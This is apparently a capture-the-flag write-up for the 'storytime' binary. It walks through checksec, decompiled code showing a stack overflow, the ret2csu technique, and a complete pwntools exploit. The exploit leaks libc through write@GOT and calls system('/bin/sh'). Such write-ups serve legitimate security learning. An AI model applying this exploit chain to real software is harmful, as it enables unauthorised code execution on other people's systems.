Reconnaissance

I started with checksecing the binary:

(pwn) eric@Eric:~/nightmare/storytime$ checksec storytime
[*] '/home/eric/nightmare/storytime/storytime'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

We see that Partial RELRO is enabled, so we could do a GOT overwrite. NX is enabled so shellcoding is off the table, and there is no canary or PIE in the binary. So ROP or a GOT overwrite seem like the angle here.

I then ran the binary, and provided a large input.

(pwn) eric@Eric:~/nightmare/storytime$ ./storytime
HSCTF PWNNNNNNNNNNNNNNNNNNNN
Tell me a story: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
(pwn) eric@Eric:~/nightmare/storytime$

So there is a buffer overflow. This seems pretty easy…

Vulnerability Analysis

Opened up the binary in ghidra to take a look what I can work with here.

Main function:

undefined8 main(void)
{
  undefined1 local_38 [48];
  
  setvbuf(stdout,(char *)0x0,2,0);
  write(1,"HSCTF PWNNNNNNNNNNNNNNNNNNNN\n",0x1d);
  write(1,"Tell me a story: \n",0x12);
  read(0,local_38,400);
  return 0;
}

A super large overflow in our initial main function to overwrite return address. What should we overwrite it with? I looked for a win function, but was met with a beginning, middle, climax, and end function.

void beginning(void) {
  write(1,"Once upon a time...\n",0x28);
  return;
}

void middle(void) {
  write(1,"Middle of story is the best! :D\n",0x28);
  return;
}

void climax(void) {
  undefined1 local_38 [48];
  read(0,local_38,4000);
  return;
}

void end(void) {
  write(1,"The End!\n",0x28);
  return;
}

So two things we notice here.

  1. There is no puts call, so we can not leak libc with puts(puts). Usually the ideal option when we are working with really small binaries with not many of gadgets available to us. (Almost always a pop rdi ; ret gadget in every binary).

  2. There is another huge overflow in the climax function.

Exploitation Strategy: Ret2CSU

So in order to obtain a leak, we can call write on one of the GOT entries, but how can we control the registers that we don’t have access to? Like rdx?

There are two approaches, either living off the land (hoping rdx is set to a favorable number for us) or we can set rdx ourselves. But how?? There is usually no pop rdx ; ret gadget in binaries.

For that, we will use ret2csu! Ret2csu is a technique where we can populate all of the registers with things we want regardless of having access to a pop rdx, or any of the gadgets we might need for that matter!

gef➤  disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:
...
   0x00000000004006e0 <+64>:    mov    rdx,r15
   0x00000000004006e3 <+67>:    mov    rsi,r14
   0x00000000004006e6 <+70>:    mov    edi,r13d
   0x00000000004006e9 <+73>:    call   QWORD PTR [r12+rbx*8]
...
   0x00000000004006fa <+90>:    pop    rbx
   0x00000000004006fb <+91>:    pop    rbp
   0x00000000004006fc <+92>:    pop    r12
   0x00000000004006fe <+94>:    pop    r13
   0x0000000000400700 <+96>:    pop    r14
   0x0000000000400702 <+98>:    pop    r15
   0x0000000000400704 <+100>:   ret

When we look at the assembly for this function, we see that there is a pop rbx, rbp, r12, r13, r14, and r15 gadget. How can that be useful to us? Right above it, there is mov rdx, r15, mov rsi, r14, mov edi, r13d and call QWORD PTR [r12+rbx*8].

That means that we can populate the registers with what we need, and call whatever is in r12.

Here is the stack layout for the Ret2CSU chain:

       High Addresses
  +----------------------+
  |   Padding (56 'A's)  |  <-- Fills local buffer
  +----------------------+
  |       csu_pop        |  <-- Overwrites Return Address (jumps to 0x4006fa)
  +----------------------+
  |          0           |  <-- Popped into RBX
  +----------------------+
  |          1           |  <-- Popped into RBP (Must be 1 for loop check)
  +----------------------+
  |      write_got       |  <-- Popped into R12 (Function to call)
  +----------------------+
  |          1           |  <-- Popped into R13 (Moves to EDI -> fd)
  +----------------------+
  |       read_got       |  <-- Popped into R14 (Moves to RSI -> buf)
  +----------------------+
  |          8           |  <-- Popped into R15 (Moves to RDX -> count)
  +----------------------+
  |       csu_call       |  <-- Return Address (jumps to 0x4006e0 to execute call)
  +----------------------+
  |          0           |  <-- "add rsp, 0x8" Padding (Skipped after call returns)
  +----------------------+
  |          0           |  <-- Junk for pop rbx
  +----------------------+
  |          0           |  <-- Junk for pop rbp
  +----------------------+
  |          0           |  <-- Junk for pop r12
  +----------------------+
  |          0           |  <-- Junk for pop r13
  +----------------------+
  |          0           |  <-- Junk for pop r14
  +----------------------+
  |          0           |  <-- Junk for pop r15
  +----------------------+
  |        climax        |  <-- Final Return Address (Starts Stage 2)
  +----------------------+
       Low Addresses

So our plan of attack is:

  1. Overflow main buffer.

  2. Use the CSU pop gadget -> populate the registers with exactly what we need.

  3. Use the CSU call function to mov everything into edi, rsi, and rdx, and call write.

  4. Finish the execution of CSU by populating the registers correctly (padding the cleanup).

  5. After this, we get the leak, and then can move on with our second overflow, where we have the libc base and call system("/bin/sh").

The Exploit

This is the exploit I used to pop a shell:

from pwn import *

e = ELF('./storytime')
le = e.libc
p = process(e.path)

poprdi = 0x400703
ret = 0x40048e
climax = e.sym['climax']

csu_pop = 0x4006fa
csu_call = 0x4006e0

writegot = e.got['write']
readgot = e.got['read']

payload = b'A' * 56

payload += p64(csu_pop)
payload += p64(0) + p64(1) + p64(writegot) + p64(1) + p64(readgot) + p64(8) 
payload += p64(csu_call)
payload += p64(0)
payload += p64(0) * 6
payload += p64(climax)

p.sendafter(b'story: \n', payload)

leak = u64(p.recv(8))
log.info(f'Leaked read address: {hex(leak)}')
le.address = leak - le.sym['read']
log.success(f'Libc base: {hex(le.address)}')

system = le.sym['system']
binsh = next(le.search(b'/bin/sh\x00'))

payload2 = b'A' * 56
payload2 += p64(poprdi)
payload2 += p64(binsh)
payload2 += p64(ret)
payload2 += p64(system)

p.send(payload2)
p.interactive()
